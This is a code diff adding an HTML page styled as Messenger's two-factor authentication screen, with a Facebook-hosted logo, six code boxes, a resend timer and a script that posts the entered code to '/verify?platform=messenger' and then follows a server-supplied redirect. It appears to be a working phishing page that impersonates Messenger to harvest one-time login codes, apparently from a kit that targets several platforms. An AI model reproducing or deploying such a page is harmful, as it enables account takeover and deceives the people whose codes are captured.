@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Messenger - Security Check</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 400px;
+            width: 100%;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo {
+            width: 112px;
+            margin-bottom: 16px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1c1e21;
+            margin-bottom: 8px;
+        }
+        .subtitle {
+            color: #65676b;
+            font-size: 15px;
+            line-height: 1.4;
+            margin-bottom: 24px;
+        }
+        .otp-container {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+        .otp-input {
+            width: 40px;
+            height: 40px;
+            text-align: center;
+            font-size: 20px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+        }
+        .otp-input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        .verify-btn {
+            width: 100%;
+            height: 40px;
+            background-color: #0084ff;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .verify-btn:hover {
+            background-color: #0070db;
+        }
+        .help-text {
+            margin-top: 16px;
+            text-align: center;
+            font-size: 14px;
+            color: #65676b;
+        }
+        .help-text a {
+            color: #0084ff;
+            text-decoration: none;
+        }
+        .help-text a:hover {
+            text-decoration: underline;
+        }
+        #timer {
+            color: #65676b;
+            font-size: 14px;
+            text-align: center;
+            margin-top: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://scontent-los2-1.xx.fbcdn.net/v/t39.8562-6/120009688_325579128711709_1736249742330805861_n.png?_nc_cat=1&ccb=1-7&_nc_sid=f537c7&_nc_ohc=6oN4Q3zlh9oQ7kNvgFpAigh&_nc_oc=AdiCfRbW3KKWlOS0eaRJmScOROf6g-QLXi0WeeeYSRzykV0EcGinfW7_Ir40LqZqBdm61FFIIweKYe1WqoOB4vsQ&_nc_zt=14&_nc_ht=scontent-los2-1.xx&_nc_gid=AnSO9KWXrwUgIK5RzUkItgZ&oh=00_AYDLFBxlO7QyEiuZKQy1ArgI_277IIXmFyC7QKA-8ASgVg&oe=67AEDE3D" alt="Messenger" class="logo" style="width: 60px; height: 60px;">
+            <h1>Two-Factor Authentication</h1>
+            <p class="subtitle">Enter the 6-digit code we sent to your email to verify your identity.</p>
+        </div>
+        <form id="otpForm" action="/verify?platform=messenger" method="POST">
+            <div class="otp-container">
+                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
+            </div>
+            <button type="submit" class="verify-btn">Verify</button>
+        </form>
+        <div id="timer"></div>
+        <p class="help-text">
+            <a href="#" id="resendCode">Resend Code</a>
+        </p>
+    </div>
+
+    <script>
+        // Handle OTP input
+        const inputs = document.querySelectorAll('.otp-input');
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (e.target.value) {
+                    if (index < inputs.length - 1) {
+                        inputs[index + 1].focus();
+                    }
+                }
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+
+        // Handle form submission
+        document.getElementById('otpForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const otp = Array.from(inputs).map(input => input.value).join('');
+            
+            fetch(this.action, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify({ otp: otp })
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            })
+            .then(data => {
+                if (data.status === 'success' && data.redirect_url) {
+                    window.location.href = data.redirect_url;
+                } else {
+                    throw new Error(data.error || 'Unknown error occurred');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                // Clear inputs on error
+                inputs.forEach(input => input.value = '');
+                inputs[0].focus();
+            });
+        });
+
+        // Timer functionality
+        function startTimer(duration) {
+            let timer = duration;
+            const timerDisplay = document.getElementById('timer');
+            const resendButton = document.getElementById('resendCode');
+            resendButton.style.display = 'none';
+            
+            const interval = setInterval(() => {
+                const minutes = Math.floor(timer / 60);
+                const seconds = timer % 60;
+                
+                timerDisplay.textContent = `Resend code in ${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+                
+                if (--timer < 0) {
+                    clearInterval(interval);
+                    timerDisplay.textContent = '';
+                    resendButton.style.display = 'inline';
+                }
+            }, 1000);
+        }
+
+        // Start timer on page load (2 minutes)
+        startTimer(120);
+
+        // Handle resend code
+        document.getElementById('resendCode').addEventListener('click', function(e) {
+            e.preventDefault();
+            this.style.display = 'none';
+            startTimer(120);
+            
+            // TODO: Add API call to resend code
+            console.log('Resending code...');
+        });
+    </script>
+</body>
+</html> 
